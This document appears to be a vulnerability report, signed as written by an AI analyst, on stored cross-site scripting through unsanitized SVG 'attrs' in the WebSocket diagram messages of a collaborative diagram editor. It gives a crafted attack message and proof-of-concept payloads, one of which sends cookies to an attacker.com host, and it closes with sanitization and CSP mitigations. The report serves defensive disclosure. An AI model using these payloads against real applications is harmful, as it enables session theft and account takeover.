# WebSocket XSS Vulnerability Analysis

**Date:** 2026-03-04
**Vulnerability Type:** Stored Cross-Site Scripting (XSS) via WebSocket Messages
**Severity:** HIGH
**CVSS Score:** 8.1 (High)
**CWE:** CWE-79 (Improper Neutralization of Input During Web Page Generation)

---

## Executive Summary

A **context mismatch XSS vulnerability** exists in the WebSocket message handling system for collaborative diagram editing. While WebSocket messages undergo structural validation, the `attrs` object containing arbitrary SVG attributes is **not sanitized for XSS payloads** before being rendered by the X6 diagramming library. An attacker with write permissions to a diagram can inject malicious SVG/HTML content through WebSocket messages that will execute in the browsers of all connected collaborators.

**Attack Vector:** Authenticated attacker → WebSocket `diagram_operation` message → Malicious `attrs` object → X6 SVG rendering → XSS in all collaborator browsers

---

## Vulnerability Details

### 1. WebSocket Data Flow

**Path: WebSocket Message → Validation → Cell Creation → SVG Rendering**

```
┌─────────────────────────────────────────────────────────────────┐
│ 1. Attacker sends diagram_operation WebSocket message           │
│    with malicious attrs object                                   │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ 2. websocket.adapter.ts:_validateTMIMessage()                   │
│    ✓ Validates message structure                                │
│    ✓ Validates operation.type is string                         │
│    ✓ Validates operation.cells is array                         │
│    ✗ Does NOT validate/sanitize attrs content                   │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ 3. app-remote-operation-handler.service.ts                      │
│    Converts CellOperation → GraphOperation                       │
│    Passes attrs as-is: style: normalizedCell.attrs              │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ 4. x6-cell-extensions.ts:setLabel()                             │
│    Calls: this.setAttrByPath('text/text', label)                │
│    Directly sets SVG attributes without sanitization            │
└──────────────────────────┬──────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│ 5. @antv/x6 library renders SVG                                 │
│    ⚠ Malicious SVG/HTML rendered in DOM                         │
│    ⚠ JavaScript executes in victim browsers                     │
└─────────────────────────────────────────────────────────────────┘
```

---

### 2. Vulnerable Code Locations

#### 2.1 Missing Sanitization in WebSocket Validation

**File:** `/app/repos/tmi-ux/src/app/core/services/websocket.adapter.ts`  
**Lines:** 1110-1195 (`_validateTMIMessage()`)

```typescript
private _validateTMIMessageType(messageType: string, msg: Record<string, unknown>): string | null {
  if (messageType === 'diagram_operation') {
    if (!msg['operation'] || typeof msg['operation'] !== 'object') {
      return 'diagram_operation message must have operation object';
    }
    const operation = msg['operation'] as Record<string, unknown>;
    if (typeof operation['type'] !== 'string') {
      return 'operation must have type string';
    }
    if (!Array.isArray(operation['cells'])) {
      return 'operation must have cells array';
    }
    // ⚠️ VULNERABILITY: No validation of attrs content in cells
  }
  // ...
}
```

**Issue:** The validation only checks that `cells` is an array, but doesn't inspect the `attrs` object within each cell for dangerous content.

#### 2.2 Unsafe attrs Propagation

**File:** `/app/repos/tmi-ux/src/app/pages/dfd/application/services/app-remote-operation-handler.service.ts`  
**Lines:** 302-326

```typescript
private _convertToCellNodeOperation(
  cellOp: CellOperation,
  cellData: WSCell,
  baseOperation: Partial<GraphOperation>,
): GraphOperation | null {
  const normalizedCell = normalizeCellFormat(cellData);
  
  const nodeData: NodeData = {
    id: normalizedCell.id,
    nodeType: normalizedCell.shape,
    position: normalizedCell.position,
    size: normalizedCell.size,
    label: typeof label === 'string' ? label : undefined,
    style: normalizedCell.attrs as Record<string, any>,  // ⚠️ attrs passed unsanitized
    properties: normalizedCell as Record<string, any>,
  };
  // ...
}
```

**Issue:** The `attrs` object is cast to `Record<string, any>` and passed directly to the node/edge creation without any sanitization.

#### 2.3 Direct SVG Attribute Setting

**File:** `/app/repos/tmi-ux/src/app/pages/dfd/utils/x6-cell-extensions.ts`  
**Lines:** 84-159

```typescript
(Cell.prototype as any).setLabel = function (label: string): void {
  if (this.isNode()) {
    // For nodes, set the text attribute directly
    this.setAttrByPath('text/text', label);  // ⚠️ No sanitization
  } else if (this.isEdge()) {
    // For edges, preserve existing label position
    (this as Edge).setLabels([{
      position: 0.5,
      attrs: {
        text: {
          text: label,  // ⚠️ No sanitization
          fontSize: DFD_STYLING.DEFAULT_FONT_SIZE,
          // ...
        },
      },
    }]);
  }
};
```

**Issue:** The `setAttrByPath` method from X6 directly sets SVG attributes without HTML/SVG sanitization. If `label` contains malicious content, it's rendered as-is.

---

### 3. Attack Scenario

#### Step 1: Attacker Crafts Malicious WebSocket Message

An authenticated attacker with write permissions sends a `diagram_operation_request` message:

```json
{
  "message_type": "diagram_operation_request",
  "operation_id": "attack-123",
  "base_vector": 1,
  "operation": {
    "type": "patch",
    "cells": [{
      "id": "xss-node-1",
      "operation": "add",
      "data": {
        "id": "xss-node-1",
        "shape": "process",
        "position": { "x": 100, "y": 100 },
        "size": { "width": 200, "height": 100 },
        "attrs": {
          "text": {
            "text": "<img src=x onerror='alert(document.cookie)'>",
            "fontSize": 14,
            "fill": "#333"
          },
          "body": {
            "fill": "#ffffff",
            "stroke": "#000000",
            "onclick": "alert('XSS')"
          }
        }
      }
    }]
  }
}
```

#### Step 2: Server Validation (Passes)

The WebSocket adapter's `_validateTMIMessage()` validates:
- ✅ Message has `message_type`
- ✅ Message has `operation` object
- ✅ Operation has `type` string
- ✅ Operation has `cells` array
- ❌ **Does NOT validate `attrs` content**

Message is accepted and broadcast to all collaborators.

#### Step 3: Remote Operation Handler Processes

`app-remote-operation-handler.service.ts` converts the message:
- Extracts `cellData.attrs` 
- Passes it as `style: normalizedCell.attrs`
- **No sanitization occurs**

#### Step 4: X6 Renders Malicious SVG

The X6 library receives the attrs and renders:
```html
<svg>
  <rect fill="#ffffff" stroke="#000000" onclick="alert('XSS')">
  <text>
    <img src=x onerror='alert(document.cookie)'>
  </text>
</svg>
```

#### Step 5: XSS Executes in All Collaborator Browsers

- The `onerror` handler executes when the invalid image loads
- The `onclick` handler executes when users click the shape
- The attacker can steal session tokens, perform actions as the victim, or inject additional malicious content

---

### 4. Proof of Concept Payloads

#### Payload 1: Cookie Stealer via SVG onload
```json
{
  "attrs": {
    "text": {
      "text": "<svg/onload=fetch('https://attacker.com/steal?c='+document.cookie)>"
    }
  }
}
```

#### Payload 2: Event Handler Injection
```json
{
  "attrs": {
    "body": {
      "fill": "#fff",
      "onclick": "eval(atob('YWxlcnQoJ1hTUycp'))"
    }
  }
}
```

#### Payload 3: SVG Script Tag (if not filtered by X6)
```json
{
  "attrs": {
    "text": {
      "text": "<svg><script>alert('XSS')</script></svg>"
    }
  }
}
```

#### Payload 4: Unicode/HTML Entity Bypass
```json
{
  "attrs": {
    "text": {
      "text": "&#x3C;img src=x onerror=alert(1)&#x3E;"
    }
  }
}
```

---

### 5. Impact Assessment

#### 5.1 Confidentiality Impact: **HIGH**
- Attacker can steal authentication tokens (JWT)
- Access to all diagram data visible to victim
- Potential access to other threat models if session is hijacked

#### 5.2 Integrity Impact: **HIGH**
- Attacker can modify diagrams on behalf of victims
- Can inject persistent malicious content
- Can modify threat model data through victim's session

#### 5.3 Availability Impact: **MEDIUM**
- Can inject content that crashes browsers
- Can create infinite loops or resource exhaustion
- Can disrupt collaborative editing sessions

#### 5.4 Attack Complexity: **LOW**
- Attacker only needs write permissions (standard collaborator access)
- No social engineering required
- Fully automatable via WebSocket client

#### 5.5 Scope: **CHANGED**
- XSS executes in context of the application domain
- Can affect all users viewing the compromised diagram
- Can propagate to other diagrams if attacker modifies multiple diagrams

---

### 6. Root Cause Analysis

The vulnerability stems from a **context mismatch** between validation and rendering:

1. **Validation Context**: The `_validateTMIMessage()` function validates **structure** (is `attrs` an object?) but not **content** (does `attrs` contain safe values?)

2. **Rendering Context**: The X6 library expects **safe, pre-sanitized** SVG attributes. It directly renders whatever attributes it receives without HTML/SVG sanitization.

3. **Missing Security Layer**: There is no sanitization layer between WebSocket message receipt and X6 rendering. The code path assumes all `attrs` values are safe.

4. **DOMPurify Available But Not Used**: The application imports DOMPurify (`dompurify` in package.json line 82) for markdown rendering but does NOT use it for SVG attributes from WebSocket messages.

---

### 7. Comparison with Safe Markdown Rendering

The application **correctly sanitizes** markdown content but **fails to sanitize** SVG attributes:

**Safe Pattern (Markdown):**
```typescript
// app.config.ts line 47
import DOMPurify from 'dompurify';

// Markdown is sanitized before rendering
provide(SANITIZE, () => (html: string) => DOMPurify.sanitize(html))
```

**Unsafe Pattern (WebSocket SVG attrs):**
```typescript
// NO sanitization before passing to X6
style: normalizedCell.attrs as Record<string, any>
```

---

### 8. Evidence of Vulnerability

#### 8.1 No Sanitization in WebSocket Path
```bash
$ grep -r "DOMPurify\|sanitize" src/app/pages/dfd/
# Returns: Only references to "sanitizeCell" for history filtering
# Does NOT show any XSS sanitization
```

#### 8.2 Direct Attribute Setting
```typescript
// x6-cell-extensions.ts:87
this.setAttrByPath('text/text', label);
// No sanitization wrapper around 'label'
```

#### 8.3 X6 Library Behavior
- X6 version 2.19.2 (package.json line 71)
- X6 is a low-level SVG rendering library
- It does NOT provide built-in XSS protection
- Cloudsmith reports 0 CVEs for X6, but this is expected - X6's responsibility is rendering, not security

---

### 9. Affected Components

1. **websocket.adapter.ts** - Missing content validation
2. **websocket-message.types.ts** - Cell interface allows arbitrary attrs
3. **app-remote-operation-handler.service.ts** - Passes unsanitized attrs
4. **x6-cell-extensions.ts** - Sets attributes without sanitization
5. **infra-x6-core-operations.service.ts** - Creates nodes with unsanitized config
6. **infra-x6-shape-definitions.ts** - Shape definitions render attrs as-is

---

### 10. Mitigations (for reference, not implementation)

#### Mitigation 1: Sanitize attrs at WebSocket Entry Point
```typescript
// In websocket.adapter.ts
import DOMPurify from 'dompurify';

private _sanitizeAttrs(attrs: Record<string, unknown>): Record<string, unknown> {
  const sanitized: Record<string, unknown> = {};
  
  for (const [key, value] of Object.entries(attrs)) {
    if (typeof value === 'string') {
      // Sanitize string values
      sanitized[key] = DOMPurify.sanitize(value, { 
        ALLOWED_TAGS: [],  // Strip all tags
        ALLOWED_ATTR: []   // Strip all attributes
      });
    } else if (typeof value === 'object' && value !== null) {
      // Recursively sanitize nested objects
      sanitized[key] = this._sanitizeAttrs(value as Record<string, unknown>);
    } else {
      sanitized[key] = value;
    }
  }
  
  return sanitized;
}
```

#### Mitigation 2: Whitelist Safe Attributes
```typescript
const SAFE_TEXT_ATTRS = ['fontSize', 'fill', 'fontFamily', 'textAnchor'];
const SAFE_BODY_ATTRS = ['fill', 'stroke', 'strokeWidth', 'rx', 'ry'];

// Only allow whitelisted attributes
```

#### Mitigation 3: Content Security Policy
```html
<meta http-equiv="Content-Security-Policy" 
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline';">
```

---

## Conclusion

The WebSocket message handling system suffers from a **critical XSS vulnerability** due to missing sanitization of the `attrs` object in diagram operations. While the validation ensures structural correctness, it does not prevent malicious HTML/SVG/JavaScript injection. An attacker with write permissions can inject XSS payloads that execute in all collaborators' browsers, leading to session hijacking, data theft, and unauthorized actions.

**Recommendation:** Implement comprehensive input sanitization using DOMPurify (already available) at the WebSocket message entry point before passing data to the X6 rendering library.

---

**Analyst:** Claude (Anthropic AI)  
**Analysis Completed:** 2026-03-04
